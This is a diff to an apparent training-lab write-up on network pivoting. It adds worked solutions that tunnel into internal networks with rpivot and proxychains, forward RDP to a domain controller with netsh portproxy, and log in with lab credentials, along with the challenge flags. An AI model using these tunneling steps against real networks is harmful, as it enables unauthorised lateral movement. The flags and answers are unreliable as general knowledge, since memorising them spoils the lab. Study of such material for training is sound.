@@ -7,6 +7,11 @@
 2. [Playing Pong with Socat](#playing-pong-with-socat)
     1. [Socat Redirection with a Reverse Shell](#socat-redirection-with-a-reverse-shell)
     2. [Socat Redirection with a Bind Shell](#socat-redirection-with-a-bind-shell)
+3. [Pivoting Around Obstacles](#pivoting-around-obstacles)
+    1. [SSH for Windows: plink.exe](#ssh-for-windows-plinkexe)
+    2. [SSH Pivoting with Sshuttle](#ssh-pivoting-with-sshuttle)
+    3. [Web Server Pivoting with Rpivot](#web-server-pivoting-with-rpivot)
+    4. [Port Forwarding with Windows Netsh](#port-forwarding-with-windows-netsh)
 
 ## Introduction
 ### Challenges
@@ -118,3 +123,76 @@
 1. What Meterpreter payload did we use to catch the bind shell session? (Submit the full path as the answer)
 
     The answer is `windows/x64/meterpreter/bind_tcp`.
+
+## Pivoting Around Obstacles
+### SSH for Windows: plink.exe
+#### Tools
+1. plink 
+2. Proxifier
+
+### SSH Pivoting with Sshuttle
+#### Tools
+1. sshuttle
+
+### Web Server Pivoting with Rpivot
+#### Tools
+1. rpivot 
+#### Challenges
+1. From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer.
+
+    The answer is `Attack Host`.
+
+2. From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host. Submit Pivot Host or Attack Host as the answer.
+
+    The answer is `Pivot Host`.
+
+3. Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer.
+
+    We can solve this by using `rpivot`. First we run `server.py` from `rpivot` in our attack host.
+
+    ```bash
+    python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+    ```
+    Then we need to transfer `rpivot` folder to our pivot host.
+
+    ```bash
+    scp -r rpivot ubuntu@10.129.81.76:/home/ubuntu/
+    ```
+    After that, in our pivot host, we can run `client.py` from `rpivot`.
+
+    ```bash
+    python2.7 client.py --server-ip 10.10.14.131 --server-port 9999
+    ```
+    Back to our attack host, we can either using `curl` or `firefox-esr`.
+
+    ```bash
+    proxychains curl http://172.16.5.135:80
+    proxychains firefox-esr 172.16.5.135:80
+    ```
+    The answer is `I_L0v3_Pr0xy_Ch@ins`.
+
+### Port Forwarding with Windows Netsh
+#### Tools
+1. netsh.exe
+#### Challenges
+1. Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive)
+
+    To solve this, first we need to rdp to the target.
+
+    ```bash
+    xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
+    ```
+    Then in the rdp session, we can do pivoting by using `netsh`.
+
+    ```powershell
+    netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.19
+    netsh.exe interface portproxy show v4tov4                 
+    ```
+    ![alt text](Assets/Pivoting1.png)
+
+    Based on that, the pivoting is verified. Then back to our attack host, we can rdp to the internal network target.
+
+    ```bash
+    xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
+    ```
+    Then we can explore to get the answer. The answer is `Jim Flipflop`.
